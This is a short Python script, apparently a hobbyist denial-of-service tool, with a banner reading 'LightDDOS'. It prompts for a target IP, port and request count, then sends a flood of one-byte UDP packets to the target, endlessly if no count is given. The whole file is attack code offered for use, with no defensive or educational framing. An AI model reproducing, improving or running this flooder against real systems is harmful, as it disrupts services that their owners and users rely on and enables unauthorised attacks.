import socket

print("""\n\n\n /$$       /$$           /$$         /$$     /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
| $$      |__/          | $$        | $$    | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
| $$       /$$  /$$$$$$ | $$$$$$$  /$$$$$$  | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
| $$      | $$ /$$__  $$| $$__  $$|_  $$_/  | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
| $$      | $$| $$  \ $$| $$  \ $$  | $$    | $$  | $$| $$  | $$| $$  | $$ \____  $$
| $$      | $$| $$  | $$| $$  | $$  | $$ /$$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$$$$$$$| $$|  $$$$$$$| $$  | $$  |  $$$$/| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|________/|__/ \____  $$|__/  |__/   \___/  |_______/ |_______/  \______/  \______/ 
               /$$  \ $$                                                            
              |  $$$$$$/                                                            
               \______/  \n\n""")

ip = input('IP >>> ')
port = int(input('Port / Default: 8080 [0 = default] >>> '))
request_num = input("# of requests to send >>> ")

if port == 0:
      port = 8080

if request_num == "":
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, port))
        i = 0
        if i < 10:
            s.send(b'\x01')    

else: 
    for i in range(int(request_num)):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, port))
        i = 0
        if i < 10:
            s.send(b'\x01')